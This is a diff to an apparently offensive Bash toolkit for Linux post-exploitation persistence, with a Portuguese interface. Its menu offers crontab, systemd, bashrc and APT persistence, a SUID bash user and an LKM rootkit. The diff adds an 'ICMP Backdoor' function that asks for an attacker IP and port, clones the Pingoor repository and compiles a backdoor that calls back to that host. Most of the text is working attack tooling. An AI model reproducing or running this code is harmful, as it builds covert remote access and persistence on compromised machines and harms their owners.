@@ -6,7 +6,7 @@ rainbow() {
 }
 
 requirements() {
-    sudo apt-get install lolcat -y
+    sudo apt-get install lolcat git make gcc -y
 }
 
 crontab() {
@@ -199,6 +199,17 @@ lkmRootkit() {
 	./implant_rootkit.sh
 }
 
+icmpBackdoor() {
+	rainbow "Digite o endereço IP que irá receber o ping: "
+	read LHOST
+	rainbow "Digite o número da porta que irá receber a conexão: "
+	read LPORT
+	git clone https://github.com/MrEmpy/Pingoor
+	cd Pingoor
+	make HOST=$LHOST PORT=$LPORT
+	rainbow "Backdoor compilado. Você pode encontra-lo em Pingoor/pingoor"
+}
+
 banner() {
     rainbow "
                                   ,
@@ -230,7 +241,7 @@ menu() {
   [01] Generate SSH keypair       [06] Bashrc Persistence      
   [02] APT Persistence            [07] Privileged user & SUID bash
   [03] Crontab Persistence        [08] LKM Rootkit
-  [04] Systemd User level         
+  [04] Systemd User level         [09] ICMP Backdoor
   [05] Systemd Root Level         
 
   	[*] Coming soon others features [*]
@@ -257,6 +268,8 @@ EOF
         userANDBashSUID
     elif [ "$MENUINPUT" == "8" ] || [ "$MENUINPUT" == "08" ]; then
         lkmRootkit
+    elif [ "$MENUINPUT" == "9" ] || [ "$MENUINPUT" == "09" ]; then
+        icmpBackdoor
     else 
         echo "Essa opção não existe"
     fi
